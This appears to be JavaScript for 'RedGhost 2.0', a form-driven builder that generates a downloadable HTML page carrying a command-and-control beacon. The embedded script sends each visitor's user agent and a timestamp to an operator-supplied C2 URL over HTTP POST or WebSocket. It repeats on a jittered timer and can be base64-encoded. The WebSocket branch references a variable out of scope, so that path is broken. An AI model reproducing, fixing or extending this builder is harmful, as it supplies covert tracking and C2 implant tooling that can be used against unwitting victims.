const form   = document.getElementById('rg-form');
const output = document.getElementById('rg-output');
const link   = document.getElementById('download-link');

form.addEventListener('submit', e => {
  e.preventDefault();
  // Gather user inputs
  const c2       = document.getElementById('c2url').value.trim();
  const transport= document.getElementById('transport').value;
  const interval = parseInt(document.getElementById('interval').value, 10);
  const jitter   = parseInt(document.getElementById('jitter').value, 10);
  const minify   = document.getElementById('minify').checked;

  // JS stub template
  let stub = `
  <script>
  (function(){
    const c2    = '${c2}';
    const transport='${transport}';
    const interval=${interval};
    const jitter=${jitter}/100;
    function beacon(){
      const delay = interval + (Math.random()*2-1)*interval*jitter;
      const data  = { ua: navigator.userAgent, t: Date.now() };
      if(transport==='ws'){
        ws.send(JSON.stringify(data));
      } else {
        fetch(c2, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
      }
      setTimeout(beacon, delay);
    }
    if(transport==='ws'){
      const ws = new WebSocket(c2);
      ws.onopen = beacon;
    } else {
      beacon();
    }
  })();
  <\/script>`;

  // Wrap into full HTML
  let html = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>RedGhost Beacon</title></head><body>
<!-- Generated by RedGhost 2.0 -->
${stub}
</body></html>`;

  if(minify){
    // simple Base64 minify
    html = 'data:text/html;base64,' + btoa(unescape(encodeURIComponent(html)));
  }

  // Create download blob
  const blob = new Blob([ html ], { type: 'text/html' });
  const url  = URL.createObjectURL(blob);
  link.href       = url;
  link.download   = `redghost2_beacon.html`;
  output.classList.remove('hidden');
});
